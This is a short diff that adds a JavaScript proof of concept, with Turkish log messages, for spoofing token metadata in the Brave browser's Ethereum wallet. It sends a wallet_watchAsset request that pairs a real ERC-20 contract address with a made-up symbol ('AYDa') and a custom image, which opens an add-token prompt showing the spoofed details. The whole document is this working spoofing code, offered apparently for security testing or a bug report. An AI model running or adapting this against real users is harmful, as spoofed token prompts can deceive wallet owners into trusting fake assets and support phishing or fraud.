@@ -1,0 +1,29 @@
+(async function triggerAhYalanDunyaSpoof() {
+    console.log("[*] 'Ah Yalan Dunya' Token Spoofing PoC Başlatıldı...");
+    
+    if (!window.braveEthereum) {
+        console.error("[-] Brave Ethereum sağlayıcısı bulunamadı.");
+        return;
+    }
+
+    try {
+        const spoofedAssetPayload = {
+            method: "wallet_watchAsset",
+            params: {
+                type: "ERC20",
+                options: {
+                    address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", // Geçerli bir kontrat adresi
+                    symbol: "AYDa", // "Ah Yalan Dunya" kısaltması veya sembolü
+                    decimals: 18,
+                    image: "https://ctftime.org/media/cache/e9/a8/e9a848849a5418f80754ffd5c793755f.png" // Özel görsel URL'si
+                }
+            }
+        };
+
+        console.log("[+] 'Ah Yalan Dunya' meta verileri gönderiliyor...");
+        await window.braveEthereum.request(spoofedAssetPayload);
+        console.log("[+] Modal başarıyla açıldı! 'Token ekle' butonunu test edebilirsiniz.");
+    } catch (e) {
+        console.warn("[!] İşlem reddedildi veya istek çakışması:", e.message);
+    }
+})();
